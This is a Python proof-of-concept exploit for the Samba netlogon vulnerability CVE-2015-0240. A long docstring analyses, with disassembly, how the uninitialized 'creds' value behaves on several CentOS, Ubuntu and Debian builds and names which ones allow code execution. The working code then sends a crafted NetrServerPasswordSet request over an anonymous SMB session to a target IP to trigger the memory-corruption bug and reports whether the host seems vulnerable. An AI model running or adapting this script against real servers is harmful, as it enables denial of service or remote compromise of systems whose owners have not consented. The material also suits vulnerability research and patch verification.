#!/usr/bin/python
"""
PoC for Samba vulnerabilty (CVE-2015-0240) by sleepya
This PoC does only triggering the bug

Reference:
- https://securityblog.redhat.com/2015/02/23/samba-vulnerability-cve-2015-0240/

#################
Exploitability against CentOS/Ubuntu binaries
#################

Below are analysis result shown the 'creds' value will be on each platform.
Only tracing binary on CentOS6 is explained how to find the uninitialized 'creds' data.

CentOS6 x86 (samba 3.6.9):
- 'creds' value is always 0x40 (computed from sizeof(struct netr_Authenticator))

CentOS6 x64 (samba 3.6.9): (only look at assembly, no test)
- 'creds' value is address in _talloc_zero() after call memset@plt (saved pc)

Ubuntu 12.04 x86 (samba 3.6.3): (confirmed code execution)
- 'creds' value is '_ptr_server_name' value in ndr_pull_netr_ServerPasswordSet() function

Ubuntu 12.04 x64 (samba 3.6.3): (only look at assembly, no test)
- 'creds' value is address in _talloc_zero() after call memset@plt (saved pc)

Ubuntu 14.04 x86 (samba 4.1.6): (only look at assembly, no test)
- 'creds' value is 'r' value in api_netr_ServerPasswordSet() function minus 0x30 ('struct talloc_chunk'  of 'r')

Ubuntu 14.04 x64 (samba 4.1.6):
- 'creds' value is 'r' value in api_netr_ServerPasswordSet() function

Debian 7 x86 (samba 3.6.6): (confirmed code execution)
- 'creds' value is '_ptr_server_name' value in ndr_pull_netr_ServerPasswordSet() function

Debian 7 x64 (samba 3.6.6): (only look at assembly, no test)
- 'creds' value is address in _talloc_zero() after call memset@plt (saved pc)


(My) Conclusion:
- code execution is possible on samba package of Ubuntu 12.04 x86 and Debian 7 x86
- code execution might be possible (very difficult) on samba package of Ubuntu 14.04 x86


#################
Analysis of samba-3.6.9-164.el6.i686 on centos6
#################

The _netr_ServerPasswordSet() function is called from api_netr_ServerPasswordSet()
function in "librpc/gen_ndr/srv_netlogon.c".

When looking in to assembly (comparing to source code) of 
_netr_ServerPasswordSet function, the creds address is "ebp-0x1c".

    00298c10 <_netr_ServerPasswordSet>:
      298c10:       55                      push   %ebp
      298c11:       89 e5                   mov    %esp,%ebp
          ...
      298c40:       e8 eb 30 e7 ff          call   10bd30 <become_root>
          ...
      298c4e:       8d 45 e4                lea    -0x1c(%ebp),%eax  ; creds address (ebp-0x1c, value is 0x40)
      298c51:       89 44 24 10             mov    %eax,0x10(%esp)   ; pass creds to netr_creds_server_step_check()
          ...
      298c78:       e8 a3 cd ff ff          call   295a20 <_netr_GetDcName+0x280> ; netr_creds_server_step_check
          ...
      298c83:       e8 78 2f e7 ff          call   10bc00 <unbecome_root>


Running the PoC against samba-3.6.9 on centos6 x86, the creds value in 
_netr_ServerPasswordSet() function is always 0x40. To tracking the uninitialized 
value of creds, I check the source in api_netr_ServerPasswordSet() function. 
I found the call to talloc_zero() function before calling to _netr_ServerPasswordSet()
function.

    r->out.return_authenticator = talloc_zero(r, struct netr_Authenticator);
    if (r->out.return_authenticator == NULL) {
        talloc_free(r);
        return false;
    }

    r->out.result = _netr_ServerPasswordSet(p, r);


I checked the assembly of _talloc_zero() function. The "ebp+0x1c" is set inside
this function. After tracking define and use, the value at "ebp+0x1c" is computed
from 2nd argument of _talloc_zero().


    00004ae0 <_talloc_zero>:
        4ae0:       55                      push   %ebp
        4ae1:       89 e5                   mov    %esp,%ebp
          ...
        4afa:       8b 7d 0c                mov    0xc(%ebp),%edi  ; 2nd argument to edi
          ...
        4b41:       8d 77 3f                lea    0x3f(%edi),%esi
        4b44:       83 e6 f0                and    $0xfffffff0,%esi
        4b47:       89 75 e4                mov    %esi,-0x1c(%ebp) ; same stack address as creds


The 2nd arguemnt of _talloc_zero() function is 'size'. The size value is 
sizeof(struct netr_Authenticator), which is 0xc bytes. That's why the uninitialized
value of creds in _netr_ServerPasswordSet() function is always 0x40 on centos6.

So code execution seems to be impossible for me on centos6 samba-3.6.9-164.el6.i686.

#################

"""

import sys

import impacket
from impacket.dcerpc.v5 import transport, nrpc
from impacket.dcerpc.v5.ndr import NDRCALL

if len(sys.argv) < 2:
    print("Usage: {} <target_ip>".format(sys.argv[0]))
    sys.exit(1)
    
target = sys.argv[1]

username = ''
password = ''

###
# impacket does not implement NetrServerPasswordSet
###
from impacket.dcerpc.v5.dtypes import *

# 3.5.4.4.6 NetrServerPasswordSet (Opnum 6)
class NetrServerPasswordSet(NDRCALL):
    opnum = 6
    structure = (
       ('PrimaryName',nrpc.PLOGONSRV_HANDLE),
       ('AccountName',WSTR),
       ('SecureChannelType',nrpc.NETLOGON_SECURE_CHANNEL_TYPE),
       ('ComputerName',WSTR),
       ('Authenticator',nrpc.NETLOGON_AUTHENTICATOR),
       ('UasNewPassword',nrpc.ENCRYPTED_NT_OWF_PASSWORD),
    )

class NetrServerPasswordSetResponse(NDRCALL):
    structure = (
       ('ReturnAuthenticator',nrpc.NETLOGON_AUTHENTICATOR),
       ('ErrorCode',NTSTATUS),
    )

nrpc.OPNUMS[6] = (NetrServerPasswordSet, NetrServerPasswordSetResponse)


###
# connect to target
###
rpctransport = transport.DCERPCTransportFactory(r'ncacn_np:%s[\PIPE\netlogon]' % target)
rpctransport.set_credentials('','')  # NULL session
rpctransport.set_dport(445)
# impacket has a problem with SMB2 dialect against samba4
# force to 'NT LM 0.12' only
rpctransport.preferred_dialect('NT LM 0.12')

dce = rpctransport.get_dce_rpc()
dce.connect()
dce.bind(nrpc.MSRPC_UUID_NRPC)

###
# request for session key
###
#resp = nrpc.hNetrServerReqChallenge(dce, NULL, target + '\x00', '12345678')
#resp.dump()
#serverChallenge = resp['ServerChallenge']
#sessionKey = nrpc.ComputeSessionKeyStrongKey(password, '12345678', serverChallenge, None)
sessionKey = '\x00'*16


###
# prepare ServerPasswordSet request
###
authenticator = nrpc.NETLOGON_AUTHENTICATOR()
authenticator['Credential'] = nrpc.ComputeNetlogonCredential('12345678', sessionKey)
authenticator['Timestamp'] = 10

uasNewPass = nrpc.ENCRYPTED_NT_OWF_PASSWORD()
uasNewPass['Data'] = '\x00'*16

primaryName = nrpc.PLOGONSRV_HANDLE()
# ReferentID field of PrimaryName controls the uninitialized value of creds in ubuntu 12.04 32bit
primaryName.fields['ReferentID'] = 0x41414141

request = NetrServerPasswordSet()
request['PrimaryName'] = primaryName
request['AccountName'] = username+'a\x00'
request['SecureChannelType'] = nrpc.NETLOGON_SECURE_CHANNEL_TYPE.WorkstationSecureChannel
request['ComputerName'] = target+'\x00'
request['Authenticator'] = authenticator
request['UasNewPassword'] = uasNewPass


DCERPCSessionError = nrpc.DCERPCSessionError
try:
    resp = dce.request(request)
    print("no error !!! error code: 0xc0000225 or 0xc0000034 is expected")
    print("seems not vulnerable")
    #resp.dump()
    dce.disconnect()
except DCERPCSessionError as e:
    # expect error_code: 0xc0000225 - STATUS_NOT_FOUND
    # expect error_code: 0xc0000034 - STATUS_OBJECT_NAME_NOT_FOUND
    print("seems not vulnerable")
    #resp.dump()
    dce.disconnect()
except impacket.nmb.NetBIOSError as e:
    if e.args[0] == 'Error while reading from remote':
        print("connection lost!!!\nmight be vulnerable")
    else:
        raise

